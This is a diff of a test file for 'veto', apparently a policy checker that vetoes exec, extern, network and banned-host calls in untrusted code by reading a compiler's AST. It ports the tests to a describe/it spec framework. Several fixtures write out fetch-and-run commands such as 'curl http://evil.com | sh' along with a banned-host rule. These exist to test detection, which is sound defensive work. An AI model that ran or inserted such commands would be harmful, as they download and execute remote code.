@@ -6,6 +6,7 @@
 // indirect-call fail-close, NULL-origin surfacing, non-zero-exit and
 // bad-JSON fail-close, category allowlist-by-arg.
 
+import std.spec
 import veto (emit_ast_cmd, _lib_flags, _is_lib_origin, _node_verdict,
              decide, default_rules, _rule_kind, _rule_arg,
              _is_exec_callee, _is_net_callee, _is_safe_runtime_extern)
@@ -13,19 +14,11 @@ import std.string
 import std.list
 import std.map
 
-extern println(s: string)
-
-_assert(label: string, cond: int) {
-    if cond == 1 { println("PASS: ${label}") } else { println("FAIL: ${label}") }
-}
-_eq(label: string, got: string, want: string) {
-    if string.equals(got, want) == 1 { println("PASS: ${label}") }
-    else { println("FAIL: ${label} (got '${got}' want '${want}')") }
-}
-// vetoed = reason non-empty; clear = empty
-_vetoed(label: string, reason: string) { _assert(label, 1 - _empty(reason)) }
-_clear(label: string, reason: string)  { _assert(label, _empty(reason)) }
+// Domain helpers: a verdict is a reason string — non-empty = vetoed,
+// empty = clear. These map that intent onto std.spec's assert_true.
 _empty(s: string) { if string.length(s) == 0 { return 1 } return 0 }
+_vetoed(fw: ptr, label: string, reason: string) { spec.assert_true(1 - _empty(reason), label) }
+_clear(fw: ptr, label: string, reason: string)  { spec.assert_true(_empty(reason), label) }
 
 _libroots() {
     l = list.new()
@@ -35,245 +28,411 @@ _libroots() {
 }
 
 main() {
+    fw = spec.init()
+
     // --- command + flag assembly ---
     roots = _libroots()
-    _eq("emit_ast_cmd minimal",
-        emit_ast_cmd("aetherc", "", "/t/app.ae"),
-        "'aetherc' --emit=ast '/t/app.ae'")
-    _eq("lib_flags two roots",
-        _lib_flags(roots),
-        " --lib '/home/me/.aeb/lib' --lib '/usr/local/share/aeb/lib'")
-    _eq("lib_flags null → ''", _lib_flags(null), "")
-    _eq("emit_ast_cmd with libs",
-        emit_ast_cmd("aetherc", _lib_flags(roots), "/t/app.ae"),
-        "'aetherc' --emit=ast --lib '/home/me/.aeb/lib' --lib '/usr/local/share/aeb/lib' '/t/app.ae'")
 
-    // --- rule split ---
-    _eq("rule kind", _rule_kind("extern\t"), "extern")
-    _eq("rule arg empty", _rule_arg("extern\t"), "")
-    _eq("rule arg specific", _rule_arg("import\tstd.net"), "std.net")
+    spec.describe(fw, "command + flag assembly") {
+        spec.it("emit_ast_cmd minimal") callback {
+            spec.assert_str_eq(
+                emit_ast_cmd("aetherc", "", "/t/app.ae"),
+                "'aetherc' --emit=ast '/t/app.ae'", "emit_ast_cmd minimal")
+        }
+        spec.it("lib_flags two roots") callback {
+            spec.assert_str_eq(
+                _lib_flags(roots),
+                " --lib '/home/me/.aeb/lib' --lib '/usr/local/share/aeb/lib'", "lib_flags two roots")
+        }
+        spec.it("lib_flags null → ''") callback {
+            spec.assert_str_eq(_lib_flags(null), "", "lib_flags null → ''")
+        }
+        spec.it("emit_ast_cmd with libs") callback {
+            spec.assert_str_eq(
+                emit_ast_cmd("aetherc", _lib_flags(roots), "/t/app.ae"),
+                "'aetherc' --emit=ast --lib '/home/me/.aeb/lib' --lib '/usr/local/share/aeb/lib' '/t/app.ae'",
+                "emit_ast_cmd with libs")
+        }
+    }
 
-    // --- callee family classifiers ---
-    _assert("os_system is exec", _is_exec_callee("os_system"))
-    _assert("os_run_pipe is exec", _is_exec_callee("os_run_pipe"))
-    _assert("string_concat is NOT exec", 1 - _is_exec_callee("string_concat"))
-    _assert("tcp_connect is net", _is_net_callee("tcp_connect"))
-    _assert("http_get is net", _is_net_callee("http_get"))
-    _assert("os_system is NOT net", 1 - _is_net_callee("os_system"))
+    spec.describe(fw, "rule split") {
+        spec.it("rule kind") callback {
+            spec.assert_str_eq(_rule_kind("extern\t"), "extern", "rule kind")
+        }
+        spec.it("rule arg empty") callback {
+            spec.assert_str_eq(_rule_arg("extern\t"), "", "rule arg empty")
+        }
+        spec.it("rule arg specific") callback {
+            spec.assert_str_eq(_rule_arg("import\tstd.net"), "std.net", "rule arg specific")
+        }
+    }
 
-    // --- origin classification ---
-    _assert("file under lib root → lib origin",
-        _is_lib_origin("/home/me/.aeb/lib/bash/module.ae", roots))
-    _assert("untrusted file → not lib origin",
-        1 - _is_lib_origin("/work/dispatched/.build.ae", roots))
-    _assert("empty file → not lib origin", 1 - _is_lib_origin("", roots))
+    spec.describe(fw, "callee family classifiers") {
+        spec.it("os_system is exec") callback {
+            spec.assert_true(_is_exec_callee("os_system"), "os_system is exec")
+        }
+        spec.it("os_run_pipe is exec") callback {
+            spec.assert_true(_is_exec_callee("os_run_pipe"), "os_run_pipe is exec")
+        }
+        spec.it("string_concat is NOT exec") callback {
+            spec.assert_true(1 - _is_exec_callee("string_concat"), "string_concat is NOT exec")
+        }
+        spec.it("tcp_connect is net") callback {
+            spec.assert_true(_is_net_callee("tcp_connect"), "tcp_connect is net")
+        }
+        spec.it("http_get is net") callback {
+            spec.assert_true(_is_net_callee("http_get"), "http_get is net")
+        }
+        spec.it("os_system is NOT net") callback {
+            spec.assert_true(1 - _is_net_callee("os_system"), "os_system is NOT net")
+        }
+    }
+
+    spec.describe(fw, "origin classification") {
+        spec.it("file under lib root → lib origin") callback {
+            spec.assert_true(_is_lib_origin("/home/me/.aeb/lib/bash/module.ae", roots),
+                "file under lib root → lib origin")
+        }
+        spec.it("untrusted file → not lib origin") callback {
+            spec.assert_true(1 - _is_lib_origin("/work/dispatched/.build.ae", roots),
+                "untrusted file → not lib origin")
+        }
+        spec.it("empty file → not lib origin") callback {
+            spec.assert_true(1 - _is_lib_origin("", roots), "empty file → not lib origin")
+        }
+    }
 
     rules = default_rules()   // deny extern, deny exec
 
     // === Per-node verdict edge cases ===
+    spec.describe(fw, "per-node verdict edge cases") {
+        // exec call in UNTRUSTED code → veto.
+        spec.it("untrusted os_system vetoed") callback {
+            _vetoed(fw, "untrusted os_system vetoed",
+                _node_verdict("function_call", "os_system", "", "", "/work/app.ae", 0, "", 0, roots, rules))
+        }
 
-    // exec call in UNTRUSTED code → veto.
-    _vetoed("untrusted os_system vetoed",
-        _node_verdict("function_call", "os_system", "", "", "/work/app.ae", 0, "", 0, roots, rules))
+        // THE ALIAS-DEFEAT CASE: the call resolved to os_system regardless of
+        // how it was spelled — the AST already canonicalised it.
+        spec.it("resolved os_system vetoed even if user wrote an alias") callback {
+            _vetoed(fw, "resolved os_system vetoed even if user wrote an alias",
+                _node_verdict("function_call", "os_system", "", "", "/work/app.ae", 0, "", 0, roots, rules))
+        }
 
-    // THE ALIAS-DEFEAT CASE: the call resolved to os_system regardless of
-    // how it was spelled — the AST already canonicalised it.
-    _vetoed("resolved os_system vetoed even if user wrote an alias",
-        _node_verdict("function_call", "os_system", "", "", "/work/app.ae", 0, "", 0, roots, rules))
+        // SAME call but from a TRUSTED --lib SDK → exempt (lib/bash legitimately
+        // shells out). This is the load-bearing origin discrimination.
+        spec.it("SDK os_system exempt (lib origin)") callback {
+            _clear(fw, "SDK os_system exempt (lib origin)",
+                _node_verdict("function_call", "os_system", "", "", "/home/me/.aeb/lib/bash/module.ae", 0, "", 0, roots, rules))
+        }
 
-    // SAME call but from a TRUSTED --lib SDK → exempt (lib/bash legitimately
-    // shells out). This is the load-bearing origin discrimination.
-    _clear("SDK os_system exempt (lib origin)",
-        _node_verdict("function_call", "os_system", "", "", "/home/me/.aeb/lib/bash/module.ae", 0, "", 0, roots, rules))
-
-    // extern declaration in untrusted code → veto (the choke point).
-    _vetoed("untrusted extern syscall vetoed",
-        _node_verdict("extern_function", "", "syscall", "", "/work/app.ae", 0, "", 0, roots, rules))
+        // extern declaration in untrusted code → veto (the choke point).
+        spec.it("untrusted extern syscall vetoed") callback {
+            _vetoed(fw, "untrusted extern syscall vetoed",
+                _node_verdict("extern_function", "", "syscall", "", "/work/app.ae", 0, "", 0, roots, rules))
+        }
+    }
 
     // --- runtime-extern allowlist (found by the live smoke: every .ae
     //     declares extern println; a blanket deny would false-positive) ---
-    _assert("println is a safe runtime extern", _is_safe_runtime_extern("println"))
-    _assert("syscall is NOT safe", 1 - _is_safe_runtime_extern("syscall"))
-    _assert("fopen is NOT safe", 1 - _is_safe_runtime_extern("fopen"))
-    // whole-category deny extern EXEMPTS println…
-    _clear("whole deny-extern exempts println (allowlist)",
-        _node_verdict("extern_function", "", "println", "", "/work/app.ae", 0, "", 0, roots, rules))
-    // …but still trips the dangerous ones.
-    _vetoed("whole deny-extern still vetoes fopen",
-        _node_verdict("extern_function", "", "fopen", "", "/work/app.ae", 0, "", 0, roots, rules))
-    // a SPECIFIC extern rule overrides the allowlist (operator can deny println).
-    denyprintln = list.new()
-    list.add(denyprintln, "extern\tprintln")
-    _vetoed("specific extern\\tprintln overrides the allowlist",
-        _node_verdict("extern_function", "", "println", "", "/work/app.ae", 0, "", 0, roots, denyprintln))
-    // extern in a trusted SDK → exempt.
-    _clear("SDK extern exempt",
-        _node_verdict("extern_function", "", "fopen", "", "/usr/local/share/aeb/lib/c/module.ae", 0, "", 0, roots, rules))
+    spec.describe(fw, "runtime-extern allowlist") {
+        spec.it("println is a safe runtime extern") callback {
+            spec.assert_true(_is_safe_runtime_extern("println"), "println is a safe runtime extern")
+        }
+        spec.it("syscall is NOT safe") callback {
+            spec.assert_true(1 - _is_safe_runtime_extern("syscall"), "syscall is NOT safe")
+        }
+        spec.it("fopen is NOT safe") callback {
+            spec.assert_true(1 - _is_safe_runtime_extern("fopen"), "fopen is NOT safe")
+        }
+        // whole-category deny extern EXEMPTS println…
+        spec.it("whole deny-extern exempts println (allowlist)") callback {
+            _clear(fw, "whole deny-extern exempts println (allowlist)",
+                _node_verdict("extern_function", "", "println", "", "/work/app.ae", 0, "", 0, roots, rules))
+        }
+        // …but still trips the dangerous ones.
+        spec.it("whole deny-extern still vetoes fopen") callback {
+            _vetoed(fw, "whole deny-extern still vetoes fopen",
+                _node_verdict("extern_function", "", "fopen", "", "/work/app.ae", 0, "", 0, roots, rules))
+        }
+        // a SPECIFIC extern rule overrides the allowlist (operator can deny println).
+        spec.it("specific extern\\tprintln overrides the allowlist") callback {
+            denyprintln = list.new()
+            list.add(denyprintln, "extern\tprintln")
+            _vetoed(fw, "specific extern\\tprintln overrides the allowlist",
+                _node_verdict("extern_function", "", "println", "", "/work/app.ae", 0, "", 0, roots, denyprintln))
+        }
+        // extern in a trusted SDK → exempt.
+        spec.it("SDK extern exempt") callback {
+            _clear(fw, "SDK extern exempt",
+                _node_verdict("extern_function", "", "fopen", "", "/usr/local/share/aeb/lib/c/module.ae", 0, "", 0, roots, rules))
+        }
+    }
 
-    // INDIRECT call in untrusted code → fail-closed veto (no static target).
-    _vetoed("indirect untrusted call vetoed (fail-closed)",
-        _node_verdict("function_call", "", "", "", "/work/app.ae", 1, "", 0, roots, rules))
-    // indirect call in a trusted SDK → exempt (origin checked before indirect).
-    _clear("indirect in SDK exempt",
-        _node_verdict("function_call", "", "", "", "/home/me/.aeb/lib/x/module.ae", 1, "", 0, roots, rules))
+    spec.describe(fw, "indirect calls") {
+        // INDIRECT call in untrusted code → fail-closed veto (no static target).
+        spec.it("indirect untrusted call vetoed (fail-closed)") callback {
+            _vetoed(fw, "indirect untrusted call vetoed (fail-closed)",
+                _node_verdict("function_call", "", "", "", "/work/app.ae", 1, "", 0, roots, rules))
+        }
+        // indirect call in a trusted SDK → exempt (origin checked before indirect).
+        spec.it("indirect in SDK exempt") callback {
+            _clear(fw, "indirect in SDK exempt",
+                _node_verdict("function_call", "", "", "", "/home/me/.aeb/lib/x/module.ae", 1, "", 0, roots, rules))
+        }
+    }
 
-    // NULL/empty origin on a deny-match → surfaced (not silently trusted):
-    // the reason names <unknown-origin>.
-    nullorigin = _node_verdict("extern_function", "", "syscall", "", "", 0, "", 0, roots, rules)
-    _vetoed("NULL-origin extern still vetoed", nullorigin)
-    _assert("NULL-origin reason names unknown-origin",
-        string.index_of(nullorigin, "<unknown-origin>") >= 0)
+    spec.describe(fw, "NULL-origin surfacing") {
+        // NULL/empty origin on a deny-match → surfaced (not silently trusted):
+        // the reason names <unknown-origin>.
+        spec.it("NULL-origin extern still vetoed + names unknown-origin") callback {
+            nullorigin = _node_verdict("extern_function", "", "syscall", "", "", 0, "", 0, roots, rules)
+            _vetoed(fw, "NULL-origin extern still vetoed", nullorigin)
+            spec.assert_true(string.index_of(nullorigin, "<unknown-origin>") >= 0,
+                "NULL-origin reason names unknown-origin")
+        }
+    }
 
-    // benign call (not exec/net) in untrusted code → clear.
-    _clear("untrusted string_concat clear",
-        _node_verdict("function_call", "string_concat", "", "", "/work/app.ae", 0, "", 0, roots, rules))
+    spec.describe(fw, "benign + net + import rules") {
+        // benign call (not exec/net) in untrusted code → clear.
+        spec.it("untrusted string_concat clear") callback {
+            _clear(fw, "untrusted string_concat clear",
+                _node_verdict("function_call", "string_concat", "", "", "/work/app.ae", 0, "", 0, roots, rules))
+        }
 
-    // net rule only fires when a net rule is present (default has none).
-    _clear("default rules don't veto tcp_connect (no net rule)",
-        _node_verdict("function_call", "tcp_connect", "", "", "/work/app.ae", 0, "", 0, roots, rules))
-    netrules = list.new()
-    list.add(netrules, "net\t")
-    _vetoed("explicit net rule vetoes tcp_connect",
-        _node_verdict("function_call", "tcp_connect", "", "", "/work/app.ae", 0, "", 0, roots, netrules))
+        // net rule only fires when a net rule is present (default has none).
+        spec.it("default rules don't veto tcp_connect (no net rule)") callback {
+            _clear(fw, "default rules don't veto tcp_connect (no net rule)",
+                _node_verdict("function_call", "tcp_connect", "", "", "/work/app.ae", 0, "", 0, roots, rules))
+        }
+        spec.it("explicit net rule vetoes tcp_connect") callback {
+            netrules = list.new()
+            list.add(netrules, "net\t")
+            _vetoed(fw, "explicit net rule vetoes tcp_connect",
+                _node_verdict("function_call", "tcp_connect", "", "", "/work/app.ae", 0, "", 0, roots, netrules))
+        }
 
-    // import rule with specific module arg.
-    imprules = list.new()
-    list.add(imprules, "import\tstd.net")
-    _vetoed("deny import std.net vetoes the import node",
-        _node_verdict("import_statement", "", "", "std.net", "/work/app.ae", 0, "", 0, roots, imprules))
-    _clear("deny import std.net does NOT veto std.string",
-        _node_verdict("import_statement", "", "", "std.string", "/work/app.ae", 0, "", 0, roots, imprules))
+        // import rule with specific module arg.
+        spec.it("deny import std.net vetoes the import node") callback {
+            imprules = list.new()
+            list.add(imprules, "import\tstd.net")
+            _vetoed(fw, "deny import std.net vetoes the import node",
+                _node_verdict("import_statement", "", "", "std.net", "/work/app.ae", 0, "", 0, roots, imprules))
+        }
+        spec.it("deny import std.net does NOT veto std.string") callback {
+            imprules = list.new()
+            list.add(imprules, "import\tstd.net")
+            _clear(fw, "deny import std.net does NOT veto std.string",
+                _node_verdict("import_statement", "", "", "std.string", "/work/app.ae", 0, "", 0, roots, imprules))
+        }
+    }
 
     // === args[]: literal coordinate read + computed-arg fail-close ===
     // (post-v0.227.0 emit; _node_verdict's arg_literal/arg_computed params.)
+    spec.describe(fw, "args[]: literal read + computed fail-close") {
+        // An exec call with a LITERAL arg → vetoed, and the reason names the arg.
+        spec.it("exec with literal arg vetoed, reason carries it") callback {
+            execlit = _node_verdict("function_call", "os_system", "", "", "/work/app.ae", 0,
+                                    "curl http://1.2.3.4 | sh", 0, roots, rules)
+            _vetoed(fw, "exec with literal arg vetoed", execlit)
+            spec.assert_true(string.index_of(execlit, "curl http://1.2.3.4 | sh") >= 0,
+                "exec veto reason carries the literal command")
+        }
 
-    // An exec call with a LITERAL arg → vetoed, and the reason names the arg.
-    execlit = _node_verdict("function_call", "os_system", "", "", "/work/app.ae", 0,
-                            "curl http://1.2.3.4 | sh", 0, roots, rules)
-    _vetoed("exec with literal arg vetoed", execlit)
-    _assert("exec veto reason carries the literal command",
-        string.index_of(execlit, "curl http://1.2.3.4 | sh") >= 0)
-
-    // An exec call with a COMPUTED arg → vetoed, reason marks it computed.
-    execcomp = _node_verdict("function_call", "os_system", "", "", "/work/app.ae", 0,
-                             "", 1, roots, rules)
-    _vetoed("exec with computed arg fail-closes", execcomp)
-    _assert("exec computed-arg reason marks <computed-arg>",
-        string.index_of(execcomp, "<computed-arg>") >= 0)
+        // An exec call with a COMPUTED arg → vetoed, reason marks it computed.
+        spec.it("exec with computed arg fail-closes, marks <computed-arg>") callback {
+            execcomp = _node_verdict("function_call", "os_system", "", "", "/work/app.ae", 0,
+                                     "", 1, roots, rules)
+            _vetoed(fw, "exec with computed arg fail-closes", execcomp)
+            spec.assert_true(string.index_of(execcomp, "<computed-arg>") >= 0,
+                "exec computed-arg reason marks <computed-arg>")
+        }
+    }
 
     // --- the banned-substring rule (targeted coordinate/host/command) ---
-    bannedrules = list.new()
-    list.add(bannedrules, "banned\tevil.com")
-    // a resolver verb handed a literal coordinate containing the banned host.
-    _vetoed("banned substring in a literal coordinate vetoes",
-        _node_verdict("function_call", "maven_dep", "", "", "/work/app.ae", 0,
-                      "org.evil.com:pkg:1.0", 0, roots, bannedrules))
-    // a clean coordinate is not matched.
-    _clear("banned rule clears a coordinate without the substring",
-        _node_verdict("function_call", "maven_dep", "", "", "/work/app.ae", 0,
-                      "org.foo:bar:1.2.3", 0, roots, bannedrules))
-    // banned matches inside an exec command string too.
-    _vetoed("banned substring in an exec command vetoes",
-        _node_verdict("function_call", "os_system", "", "", "/work/app.ae", 0,
-                      "curl http://evil.com/x", 0, roots, bannedrules))
-    // banned can't match a computed arg (no string), and under a banned-only
-    // ruleset there's nothing else to fire → clears.
-    _clear("banned rule alone doesn't fire on a computed arg (nothing to match)",
-        _node_verdict("function_call", "maven_dep", "", "", "/work/app.ae", 0,
-                      "", 1, roots, bannedrules))
-    // SDK-origin coordinate with the banned substring → still exempt (origin
-    // beats everything — a vendored SDK isn't the untrusted input).
-    _clear("banned substring in SDK-origin node is exempt",
-        _node_verdict("function_call", "maven_dep", "", "", "/home/me/.aeb/lib/maven/module.ae", 0,
-                      "org.evil.com:x:1", 0, roots, bannedrules))
+    spec.describe(fw, "banned-substring rule") {
+        spec.it("banned substring in a literal coordinate vetoes") callback {
+            bannedrules = list.new()
+            list.add(bannedrules, "banned\tevil.com")
+            // a resolver verb handed a literal coordinate containing the banned host.
+            _vetoed(fw, "banned substring in a literal coordinate vetoes",
+                _node_verdict("function_call", "maven_dep", "", "", "/work/app.ae", 0,
+                              "org.evil.com:pkg:1.0", 0, roots, bannedrules))
+        }
+        spec.it("banned rule clears a coordinate without the substring") callback {
+            bannedrules = list.new()
+            list.add(bannedrules, "banned\tevil.com")
+            // a clean coordinate is not matched.
+            _clear(fw, "banned rule clears a coordinate without the substring",
+                _node_verdict("function_call", "maven_dep", "", "", "/work/app.ae", 0,
+                              "org.foo:bar:1.2.3", 0, roots, bannedrules))
+        }
+        spec.it("banned substring in an exec command vetoes") callback {
+            bannedrules = list.new()
+            list.add(bannedrules, "banned\tevil.com")
+            // banned matches inside an exec command string too.
+            _vetoed(fw, "banned substring in an exec command vetoes",
+                _node_verdict("function_call", "os_system", "", "", "/work/app.ae", 0,
+                              "curl http://evil.com/x", 0, roots, bannedrules))
+        }
+        spec.it("banned rule alone doesn't fire on a computed arg") callback {
+            bannedrules = list.new()
+            list.add(bannedrules, "banned\tevil.com")
+            // banned can't match a computed arg (no string), and under a banned-only
+            // ruleset there's nothing else to fire → clears.
+            _clear(fw, "banned rule alone doesn't fire on a computed arg (nothing to match)",
+                _node_verdict("function_call", "maven_dep", "", "", "/work/app.ae", 0,
+                              "", 1, roots, bannedrules))
+        }
+        spec.it("banned substring in SDK-origin node is exempt") callback {
+            bannedrules = list.new()
+            list.add(bannedrules, "banned\tevil.com")
+            // SDK-origin coordinate with the banned substring → still exempt (origin
+            // beats everything — a vendored SDK isn't the untrusted input).
+            _clear(fw, "banned substring in SDK-origin node is exempt",
+                _node_verdict("function_call", "maven_dep", "", "", "/home/me/.aeb/lib/maven/module.ae", 0,
+                              "org.evil.com:x:1", 0, roots, bannedrules))
+        }
+    }
 
     // --- the coordinate allowlist (coord_verb + coord_allow) ---
-    // gate maven_dep coordinates to the org.corp: group.
-    coordrules = list.new()
-    list.add(coordrules, "coord_verb\tmaven_dep")
-    list.add(coordrules, "coord_allow\torg.corp:")
-    // an allowed coordinate clears.
-    _clear("coord: allowed-prefix coordinate clears",
-        _node_verdict("function_call", "maven_dep", "", "", "/work/app.ae", 0,
-                      "org.corp:lib:1.2.3", 0, roots, coordrules))
-    // a coordinate outside the allowed prefix is vetoed.
-    _vetoed("coord: disallowed coordinate vetoed",
-        _node_verdict("function_call", "maven_dep", "", "", "/work/app.ae", 0,
-                      "com.evil:pkg:1", 0, roots, coordrules))
-    // the look-alike: starts with the group but not the pinned prefix → veto.
-    _vetoed("coord: near-miss prefix (org.corporate vs org.corp:) vetoed",
-        _node_verdict("function_call", "maven_dep", "", "", "/work/app.ae", 0,
-                      "org.corporate-evil:x:1", 0, roots, coordrules))
-    // a COMPUTED coordinate to a coord-verb fail-closes.
-    cc = _node_verdict("function_call", "maven_dep", "", "", "/work/app.ae", 0,
-                       "", 1, roots, coordrules)
-    _vetoed("coord: computed coordinate fail-closes", cc)
-    _assert("coord computed reason marks <computed-coordinate>",
-        string.index_of(cc, "<computed-coordinate>") >= 0)
-    // a call that ISN'T a coord-verb is untouched (no false-positive).
-    _clear("coord: non-coord-verb call untouched",
-        _node_verdict("function_call", "string_concat", "", "", "/work/app.ae", 0,
-                      "com.evil:x:1", 0, roots, coordrules))
-    // SDK-origin coord-verb is exempt (origin beats the gate).
-    _clear("coord: SDK-origin coord call is exempt",
-        _node_verdict("function_call", "maven_dep", "", "", "/home/me/.aeb/lib/maven/module.ae", 0,
-                      "com.evil:x:1", 0, roots, coordrules))
-    // multiple allowed prefixes: any match clears.
-    coordmulti = list.new()
-    list.add(coordmulti, "coord_verb\tmaven_dep")
-    list.add(coordmulti, "coord_allow\torg.corp:")
-    list.add(coordmulti, "coord_allow\tio.internal:")
-    _clear("coord: second allowed prefix clears",
-        _node_verdict("function_call", "maven_dep", "", "", "/work/app.ae", 0,
-                      "io.internal:tool:2", 0, roots, coordmulti))
+    spec.describe(fw, "coordinate allowlist") {
+        // gate maven_dep coordinates to the org.corp: group.
+        spec.it("allowed-prefix coordinate clears") callback {
+            coordrules = list.new()
+            list.add(coordrules, "coord_verb\tmaven_dep")
+            list.add(coordrules, "coord_allow\torg.corp:")
+            _clear(fw, "coord: allowed-prefix coordinate clears",
+                _node_verdict("function_call", "maven_dep", "", "", "/work/app.ae", 0,
+                              "org.corp:lib:1.2.3", 0, roots, coordrules))
+        }
+        spec.it("disallowed coordinate vetoed") callback {
+            coordrules = list.new()
+            list.add(coordrules, "coord_verb\tmaven_dep")
+            list.add(coordrules, "coord_allow\torg.corp:")
+            _vetoed(fw, "coord: disallowed coordinate vetoed",
+                _node_verdict("function_call", "maven_dep", "", "", "/work/app.ae", 0,
+                              "com.evil:pkg:1", 0, roots, coordrules))
+        }
+        spec.it("near-miss prefix (org.corporate vs org.corp:) vetoed") callback {
+            coordrules = list.new()
+            list.add(coordrules, "coord_verb\tmaven_dep")
+            list.add(coordrules, "coord_allow\torg.corp:")
+            // the look-alike: starts with the group but not the pinned prefix → veto.
+            _vetoed(fw, "coord: near-miss prefix (org.corporate vs org.corp:) vetoed",
+                _node_verdict("function_call", "maven_dep", "", "", "/work/app.ae", 0,
+                              "org.corporate-evil:x:1", 0, roots, coordrules))
+        }
+        spec.it("computed coordinate fail-closes, marks <computed-coordinate>") callback {
+            coordrules = list.new()
+            list.add(coordrules, "coord_verb\tmaven_dep")
+            list.add(coordrules, "coord_allow\torg.corp:")
+            // a COMPUTED coordinate to a coord-verb fail-closes.
+            cc = _node_verdict("function_call", "maven_dep", "", "", "/work/app.ae", 0,
+                               "", 1, roots, coordrules)
+            _vetoed(fw, "coord: computed coordinate fail-closes", cc)
+            spec.assert_true(string.index_of(cc, "<computed-coordinate>") >= 0,
+                "coord computed reason marks <computed-coordinate>")
+        }
+        spec.it("non-coord-verb call untouched") callback {
+            coordrules = list.new()
+            list.add(coordrules, "coord_verb\tmaven_dep")
+            list.add(coordrules, "coord_allow\torg.corp:")
+            // a call that ISN'T a coord-verb is untouched (no false-positive).
+            _clear(fw, "coord: non-coord-verb call untouched",
+                _node_verdict("function_call", "string_concat", "", "", "/work/app.ae", 0,
+                              "com.evil:x:1", 0, roots, coordrules))
+        }
+        spec.it("SDK-origin coord call is exempt") callback {
+            coordrules = list.new()
+            list.add(coordrules, "coord_verb\tmaven_dep")
+            list.add(coordrules, "coord_allow\torg.corp:")
+            // SDK-origin coord-verb is exempt (origin beats the gate).
+            _clear(fw, "coord: SDK-origin coord call is exempt",
+                _node_verdict("function_call", "maven_dep", "", "", "/home/me/.aeb/lib/maven/module.ae", 0,
+                              "com.evil:x:1", 0, roots, coordrules))
+        }
+        spec.it("second allowed prefix clears") callback {
+            // multiple allowed prefixes: any match clears.
+            coordmulti = list.new()
+            list.add(coordmulti, "coord_verb\tmaven_dep")
+            list.add(coordmulti, "coord_allow\torg.corp:")
+            list.add(coordmulti, "coord_allow\tio.internal:")
+            _clear(fw, "coord: second allowed prefix clears",
+                _node_verdict("function_call", "maven_dep", "", "", "/work/app.ae", 0,
+                              "io.internal:tool:2", 0, roots, coordmulti))
+        }
+    }
 
     // === decide(): whole-AST, fail-closed paths, real JSON shape ===
+    spec.describe(fw, "decide(): whole-AST, fail-closed paths") {
+        // The exact shape the v0.226.0 binary emits (verified live).
+        spec.it("vetoes real evil AST (extern+exec present)") callback {
+            real = "{\"nodes\":[{\"kind\":\"import_statement\",\"file\":\"/work/app.ae\",\"line\":1,\"module\":\"std.os\"},{\"kind\":\"extern_function\",\"file\":\"/work/app.ae\",\"line\":2,\"name\":\"syscall\"},{\"kind\":\"function_call\",\"file\":\"/work/app.ae\",\"line\":4,\"callee\":\"os_system\"}]}"
+            _vetoed(fw, "decide vetoes real evil AST (extern+exec present)",
+                decide(real, 0, roots, rules))
+        }
 
-    // The exact shape the v0.226.0 binary emits (verified live).
-    real = "{\"nodes\":[{\"kind\":\"import_statement\",\"file\":\"/work/app.ae\",\"line\":1,\"module\":\"std.os\"},{\"kind\":\"extern_function\",\"file\":\"/work/app.ae\",\"line\":2,\"name\":\"syscall\"},{\"kind\":\"function_call\",\"file\":\"/work/app.ae\",\"line\":4,\"callee\":\"os_system\"}]}"
-    _vetoed("decide vetoes real evil AST (extern+exec present)",
-        decide(real, 0, roots, rules))
+        // A clean tree: only a benign call, no extern/exec.
+        spec.it("clears a benign AST") callback {
+            clean = "{\"nodes\":[{\"kind\":\"import_statement\",\"file\":\"/work/app.ae\",\"line\":1,\"module\":\"std.string\"},{\"kind\":\"function_call\",\"file\":\"/work/app.ae\",\"line\":3,\"callee\":\"string_concat\"}]}"
+            _clear(fw, "decide clears a benign AST", decide(clean, 0, roots, rules))
+        }
 
-    // A clean tree: only a benign call, no extern/exec.
-    clean = "{\"nodes\":[{\"kind\":\"import_statement\",\"file\":\"/work/app.ae\",\"line\":1,\"module\":\"std.string\"},{\"kind\":\"function_call\",\"file\":\"/work/app.ae\",\"line\":3,\"callee\":\"string_concat\"}]}"
-    _clear("decide clears a benign AST", decide(clean, 0, roots, rules))
+        // Same evil call but ALL nodes are SDK-origin → clear (exemption end-to-end).
+        spec.it("clears when all matches are SDK-origin") callback {
+            sdkonly = "{\"nodes\":[{\"kind\":\"extern_function\",\"file\":\"/home/me/.aeb/lib/c/module.ae\",\"line\":2,\"name\":\"fopen\"},{\"kind\":\"function_call\",\"file\":\"/home/me/.aeb/lib/bash/module.ae\",\"line\":4,\"callee\":\"os_system\"}]}"
+            _clear(fw, "decide clears when all matches are SDK-origin", decide(sdkonly, 0, roots, rules))
+        }
 
-    // Same evil call but ALL nodes are SDK-origin → clear (exemption end-to-end).
-    sdkonly = "{\"nodes\":[{\"kind\":\"extern_function\",\"file\":\"/home/me/.aeb/lib/c/module.ae\",\"line\":2,\"name\":\"fopen\"},{\"kind\":\"function_call\",\"file\":\"/home/me/.aeb/lib/bash/module.ae\",\"line\":4,\"callee\":\"os_system\"}]}"
-    _clear("decide clears when all matches are SDK-origin", decide(sdkonly, 0, roots, rules))
+        // The post-v0.227.0 shape WITH args[]: decide() reads the literal command
+        // and the banned-substring rule fires end-to-end through the JSON walk.
+        spec.it("reads args[] literal and the banned rule fires") callback {
+            withargs = "{\"nodes\":[{\"kind\":\"function_call\",\"file\":\"/work/app.ae\",\"line\":4,\"callee\":\"os_system\",\"args\":[{\"literal\":\"curl http://evil.com | sh\"}]}]}"
+            bset = list.new()
+            list.add(bset, "banned\tevil.com")
+            bverdict = decide(withargs, 0, roots, bset)
+            _vetoed(fw, "decide reads args[] literal and the banned rule fires", bverdict)
+            spec.assert_true(string.index_of(bverdict, "curl http://evil.com | sh") >= 0,
+                "decide banned verdict carries the literal command")
+        }
+        spec.it("fail-closes on a computed exec arg via args[]") callback {
+            // a computed arg in the real shape → exec rule fail-closes through decide().
+            compargs = "{\"nodes\":[{\"kind\":\"function_call\",\"file\":\"/work/app.ae\",\"line\":4,\"callee\":\"os_system\",\"args\":[{\"computed\":true}]}]}"
+            cv = decide(compargs, 0, roots, rules)
+            _vetoed(fw, "decide fail-closes on a computed exec arg via args[]", cv)
+            spec.assert_true(string.index_of(cv, "<computed-arg>") >= 0,
+                "decide computed-exec verdict marks <computed-arg>")
+        }
 
-    // The post-v0.227.0 shape WITH args[]: decide() reads the literal command
-    // and the banned-substring rule fires end-to-end through the JSON walk.
-    withargs = "{\"nodes\":[{\"kind\":\"function_call\",\"file\":\"/work/app.ae\",\"line\":4,\"callee\":\"os_system\",\"args\":[{\"literal\":\"curl http://evil.com | sh\"}]}]}"
-    bset = list.new()
-    list.add(bset, "banned\tevil.com")
-    bverdict = decide(withargs, 0, roots, bset)
-    _vetoed("decide reads args[] literal and the banned rule fires", bverdict)
